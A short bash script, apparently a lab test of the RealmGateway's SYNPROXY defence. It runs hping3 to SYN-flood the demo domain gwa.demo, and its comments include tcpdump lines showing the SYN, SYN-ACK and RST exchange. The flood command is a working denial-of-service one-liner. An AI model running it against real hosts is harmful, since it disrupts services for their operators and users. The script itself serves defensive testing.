#!/bin/bash

echo "SYN flooding from legitimate sources the domain gwa.demo"
hping3 -c 1000 -p 80 --flood gwa.demo

# Description
# Attacker sends legitimate TCP SYN then RST the connection.
# TCP SYN are replied by the SYNPROXY which protects the RealmGateway.
# No connection state is generated on our own, on either the Router or the RealmGateway.
#
#19:19:25.740166 IP 100.64.0.254.1900 > 100.64.1.130.80: Flags [S], seq 1596820361, win 512, length 0
#19:19:25.740215 IP 100.64.1.130.80 > 100.64.0.254.1900: Flags [S.], seq 2251432260, ack 1596820362, win 0, length 0
#19:19:25.740235 IP 100.64.0.254.1900 > 100.64.1.130.80: Flags [R], seq 1596820362, win 0, length 0
